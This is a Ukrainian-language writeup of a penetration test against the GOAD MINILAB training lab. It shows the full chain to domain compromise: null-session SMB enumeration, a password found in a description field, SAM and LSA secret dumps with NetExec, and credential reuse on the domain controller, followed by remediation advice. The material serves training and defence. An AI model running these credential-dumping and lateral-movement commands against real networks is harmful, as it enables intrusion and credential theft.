# GOAD MINILAB — Writeup пентесту Active Directory

*[🇬🇧 English](./WRITEUP.en.md) · [🇷🇺 Русский](./WRITEUP.ru.md)*

## Огляд

| | |
|---|---|
| **Лаб** | GOAD MINILAB (Game Of Active Directory) |
| **Домен** | `mini.lab` (NetBIOS: `MINILAB`) |
| **Дата** | Жовтень 2026 |
| **Мета** | Повна компрометація домену |
| **Результат** | ✅ Досягнуто — доступ адміністратора на Domain Controller |

## Топологія лабораторії

| Хост | IP | Роль | ОС |
|---|---|---|---|
| DC01 | `192.168.56.30` | Контролер домену | Windows Server 2019 (Build 17763) |
| WS01 | `192.168.56.31` | Робоча станція в домені | Windows 10 (Build 19041) |

## Короткий ланцюжок атаки

```
Анонімна SMB енумерація (Null Session)
        │
        ▼
Пароль знайдено в полі "description" через SMB (bob:superman)
        │
        ▼
Локальні адмін-права на WS01 (bob)
        │
        ▼
Дамп SAM / LSA secrets на WS01
        │
        ▼
Знайдено відкритий пароль: vagrant:vagrant
        │
        ▼
Повторне використання кредів на DC01 (vagrant:vagrant)
        │
        ▼
vagrant знайдено в локальній групі "Administrators" на DC01
        │
        ▼
Повний контроль над Domain Controller (R/W файлової системи, виконання коду)
```

---

## 1. Розвідка

### 1.1 Сканування портів

```bash
nmap -sV -sC -Pn 192.168.56.30
```

**DC01 — ключові знахідки:**

| Порт | Сервіс | Примітка |
|---|---|---|
| 53 | DNS | Simple DNS Plus |
| 88 | Kerberos | — |
| 389/3268 | LDAP / Global Catalog | Домен: `mini.lab` |
| 445 | SMB | — |
| 3389 | RDP | NetBIOS-домен `MINILAB` підтверджено через `rdp-ntlm-info` |

```bash
nmap -sV -sC -Pn 192.168.56.31
```

**WS01 — ключові знахідки:**

| Порт | Сервіс | Примітка |
|---|---|---|
| 135/139/445 | RPC/SMB | SMB signing **не обов'язковий** (на відміну від DC, де примусовий) |
| 3389 | RDP | Підтверджує членство в домені (`MINILAB`) |

### 1.2 Анонімна SMB-енумерація

Виявлено, що на контролері домену увімкнена SMB Null Session:

```bash
nxc smb 192.168.56.30 -u '' -p '' --users
```

```
[*] ... (Null Auth:True) (DC:True)
-Username-    -Last PW Set-         -Description-
Guest         <never>               Built-in account for guest access...
bob           2026-10-19 17:32:30   (Password : superman)
dave          2026-10-19 17:32:54   -
```

**🔴 Знахідка №1 — Розкриття пароля через поле description SMB**

Відкритий пароль користувача `bob` (`superman`) був збережений прямо в атрибуті `description` облікового запису AD, доступному для читання через неавтентифіковане (null session) SMB-з'єднання.

---

## 2. Первинний доступ — WS01

Креди `bob:superman` перевірено на WS01:

```bash
nxc smb 192.168.56.31 -u bob -p superman
```

```
[+] mini.lab\bob:superman (Pwn3d!)
```

Позначка `(Pwn3d!)` підтверджує **права локального адміністратора** для `bob` на WS01.

### 2.1 Доступ до SYSVOL

З кредами `bob` отримано доступ до шари SYSVOL і витягнуто файли групових політик:

```bash
smbclient //192.168.56.30/SYSVOL -U "bob%superman"
```

Security-шаблони GPO (`GptTmpl.inf`) витягнуто для офлайн-аналізу — вразливих Group Policy Preferences (`cpassword`) в цьому середовищі не виявлено.

### 2.2 Дамп SAM-хешів (WS01)

```bash
nxc smb 192.168.56.31 -u bob -p superman --sam
```

```
Administrator:500:...:89ca5bc62cb5f27bd58c292baaf45603:::
```

Отримано NTLM-хеш локального Administrator — кандидат для офлайн-зламу / Pass-the-Hash.

### 2.3 Дамп LSA Secrets (WS01)

```bash
nxc smb 192.168.56.31 -u bob -p superman --lsa
```

```
vagrant:vagrant
dpapi_machinekey:8d9daa0c2db485f9c27249cba67e2e622cfbc290
dpapi_userkey:458929a0ee85af08110d395c0a12208e47572eca
```

**🔴 Знахідка №2 — Відкриті креди в LSA secrets**

Пара кредів `vagrant:vagrant` (залишений провіжинг-акаунт Vagrant) була відновлена **у відкритому вигляді** зі сховища LSA secrets на WS01.

---

## 3. Ескалація прав — повторне використання кредів на DC01

Відновлені креди `vagrant:vagrant` перевірено напряму на контролері домену:

```bash
nxc smb 192.168.56.30 -u vagrant -p vagrant
```

```
[+] mini.lab\vagrant:vagrant (Pwn3d!)
```

Підтверджено повний доступ на читання/запис до адміністративних шар:

```bash
nxc smb 192.168.56.30 -u vagrant -p vagrant --shares
```

```
ADMIN$    READ,WRITE    Remote Admin
C$        READ,WRITE    Default share
NETLOGON  READ,WRITE    Logon server share
SYSVOL    READ,WRITE    Logon server share
```

**🔴 Знахідка №3 — Повторне використання кредів між хостами домену**

Акаунт `vagrant`, спочатку відновлений з робочої станції (WS01), виявився валідним із повними адмін-правами на самому контролері домену (DC01).

### 3.1 Аналіз джерела привілеїв

Перевірено членство в групах, щоб визначити точне джерело підвищених прав `vagrant`:

```bash
net rpc group members "Domain Admins" -U "vagrant%vagrant" -S 192.168.56.30
```
```
MINILAB\Administrator
MINILAB\alice
MINILAB\carol
```

`vagrant` **не є** членом `Domain Admins`. Подальша перевірка локальної групи `Administrators` на DC01:

```bash
nxc ldap 192.168.56.30 -u vagrant -p vagrant --groups "Administrators" -o GROUP="Administrators"
```
```
Administrator
vagrant
Enterprise Admins
Domain Admins
```

**Корінну причину підтверджено:** `vagrant` був доданий напряму в **локальну групу `Administrators` на контролері домену** — не через групу безпеки `Domain Admins`. На контролері домену права локального адміністратора фактично еквівалентні повній компрометації домену (можливі DCSync, зміна GPO, створення нових акаунтів Domain Admin), оскільки DC не має окремої локальної SAM-бази, незалежної від AD.

---

## 4. Корінна причина та вплив

| | |
|---|---|
| **Корінна причина** | Провіжинг-акаунт (`vagrant`) залишений у локальній групі `Administrators` на DC після налаштування інфраструктури |
| **Сприяючий фактор** | Зберігання відкритого пароля в полі description SMB (`bob`) |
| **Сприяючий фактор** | Повторне використання пароля між хостами (`vagrant:vagrant` на WS01 і DC01) |
| **Вплив** | Повна компрометація домену Active Directory `mini.lab` |

## 5. Рекомендації з усунення

1. **Ніколи не зберігати креди в атрибутах AD** (description, notes тощо) — впроваджувати періодичні LDAP-аудити.
2. **Видаляти провіжинг/деплой-акаунти** з привілейованих груп після завершення налаштування інфраструктури.
3. **Використовувати унікальні, сильні паролі** для кожного хоста/сервісу — усунути повторне використання паролів через менеджер паролів чи керовані service-акаунти (gMSA).
4. **Вимкнути SMB Null Sessions** (налаштування реєстру `RestrictAnonymous`), щоб запобігти неавтентифікованій енумерації.
5. **Примусово застосувати SMB signing** на всіх хостах домену, не лише на DC.
6. **Регулярно аудитувати членство в локальній групі `Administrators`** на всіх приєднаних до домену системах, особливо на контролерах домену.

---

## Використані інструменти

- `nmap` — мережева розвідка
- [NetExec (nxc)](https://github.com/Pennyw0rth/NetExec) — SMB/LDAP енумерація, перевірка кредів, дамп SAM/LSA
- `smbclient` — перегляд шар і завантаження файлів
- [Impacket](https://github.com/fortra/impacket) — набір інструментів для Kerberos/SMB
- `net rpc` (Samba) — енумерація членства в групах

## Середовище лабораторії

Побудовано на [GOAD (Game Of Active Directory)](https://github.com/Orange-Cyberdefense/GOAD) від Orange Cyberdefense — конфігурація MINILAB (провайдер VirtualBox).

---

*Цей writeup документує активність, виконану виключно проти ізольованого, навмисно вразливого навчального лабу з освітньою метою.*
